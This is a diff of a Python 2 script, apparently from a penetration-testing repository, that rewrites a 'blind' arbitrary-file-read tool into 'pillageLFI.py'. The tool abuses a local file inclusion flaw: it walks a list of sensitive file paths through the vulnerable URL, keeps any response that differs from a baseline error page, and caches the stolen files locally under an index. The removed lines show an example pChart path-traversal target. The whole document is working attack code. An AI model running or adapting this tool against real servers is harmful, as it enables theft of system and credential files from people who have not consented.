@@ -1,95 +1,72 @@
 #!/usr/bin/python 
 # Author Justin Massey
 #
-# This script is to be used when you can read arbitrary files
+# This script is helpful when you find an LFI
 # You can download a pillage list at http://pwnwiki.io/presence/linux/pillage.lst
 # Pillage file also included in this repo
 #
-# usage: blindAttack.py "URL to blind injection" pillage file
-# example: blindAttack.py "10.100.2.148/pChart2.1.3/examples/index.php?Action=View&Script=/../.." pillage.lst
+# usage: pillageLFI.py "127.0.0.1/prefix/to/lfi/ "pillage.txt"
 #
-# URL must NOT have the http(s):// prefix
+# url must NOT have the http(s):// prefix
 # Currently hard coded for HTTP and not HTTPS
-# Will exit on error if server times out after 2 seconds
-# A subdirectory named blind will be created. 
-# Inside of the sub dir you will find a index.html file.
+# A subdirectory named pillaged will be created in the current working directory. 
+# Inside of the subdirectory you will find a index.html file.
 # All files pillaged will be listed in the index.html file and a cached copy of each pillaged file will be stored in their respective sub dirs
 
 
-import urllib, urllib2, sys, os
+# To do:
+# remove sys.argv and replae with optparse
+# add exception handling to see if request module errors out
+# fix error "UnicodeEncodeError: 'ascii' codec can't encode characters in position 9239-9240: ordinal not in range(128)"
+
+import urllib
+import urllib2
+import sys
+import os
+import requests
 
 
-user_agent = 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7'
-values = {'name' : 'Steve Jobs' }
-headers = { 'User-Agent' : user_agent }
+prefix = sys.argv[1]
+file = open(sys.argv[2], 'r')
 
-data = urllib.urlencode(values)
+# The variable "localfilename" which is used below includes the subdirectories and the filename of the local file pillaged
+
+def req(url):
+    r = requests.get(url)
+    return r.text
 
 # Adds a directory if one doesnt already exist
-def checkDir(file):
-	FILE = os.path.dirname(os.path.realpath(__file__))+"/"+file
-	if not os.path.exists(os.path.dirname(FILE)):
-		os.makedirs(os.path.dirname(FILE))
-	
-IP = sys.argv[1]
+def checkdir(localfilename):
+    FILE = os.path.dirname(os.path.realpath(__file__))+"/pillaged/"+localfilename
+    if not os.path.exists(os.path.dirname(FILE)):
+        os.makedirs(os.path.dirname(FILE))
+    
 
-def checkServer(server):
-	URL = "http://"+ IP +"/"
-	req = urllib2.Request(URL, data, headers)
-	try:
-		urllib2.urlopen(URL, '', 2)
-        except urllib2.URLError as e:
-                print "Server Connection Failed: "+str(e.reason)
-                sys.exit(0)
-	
+def newfile(localfilename, content):
+    page = open("pillaged/"+localfilename+ ".html", 'w+')
+    page.write(content)
+    page.close
 
-def newFile(file, content):
-        html = file+".html"
-        page = open("blind"+html, 'w+')
-        page.write(content)
-        page.close
+# This function adds a link to the pillaged file to an index.html file
+def indexfile(indexfilename, remotefilename):
+    page = open(indexfilename, "a")
+    PAGE= os.path.realpath(__file__)
+    page.write('<a href="'+os.path.dirname(PAGE)+'/pillaged/'+remotefilename+'.html ">'+remotefilename+'</a><br>\n\n')
+    page.close
+    
 
-def appFile(file, content):
-	html = file+".html"
-        page = open(file, "a")
-        PAGE= os.path.realpath(__file__)
-        page.write('<a href="'+os.path.dirname(PAGE)+'/blind'+html+'">'+content+'</a><br>\n\n')
-        page.close
-
-	
-
-def checkLen(dir):
-	if len(the_page) != 0:
-        	checkDir("blind"+dir)
-                newFile(dir, the_page)
-                appFile("blind/index.html", dir)
+def checkbaseline(localfilename, response):
+    if response != baseline:
+        checkdir(localfilename)
+        newfile(localfilename, response)
+        indexfile("pillaged/index.html", localfilename)
 
 
-checkServer("http://"+IP)
+baseline = req("http://"+prefix+"/random/file/that/doesnt/exist")
 
-file = open(sys.argv[2], 'r')
 for DIR in file:
-	dir = DIR.rstrip()
-	URL = "http://"+ IP +dir
-	print URL
-	req = urllib2.Request(URL, data, headers)
-	try: 
-		response = urllib2.urlopen(URL, '', 2)
-        	the_page = response.read()
-		checkLen(dir)
-		# Calculates length of page
+    localfilename = DIR.rstrip()
+    url = "http://"+ prefix + localfilename
+    response = req(url)
+    checkbaseline(localfilename, response)
 
-	except urllib2.HTTPError as e:
-		checkDir("blind/errors.html")
-		file = open("blind/errors.html", 'a')
-		file.write(str(e.code)+": "+URL+"\n")
-		file.close
-		continue
-	except urllib2.URLError as e:
-		# Added rstrip to remove the \n on the IP
-                checkDir("blind/errors.html")
-		file = open("blind/errors.html", 'w+')
-                file.write(str(e.reason)+": "+URL+"\n")
-                file.close
-        	continue
-	        
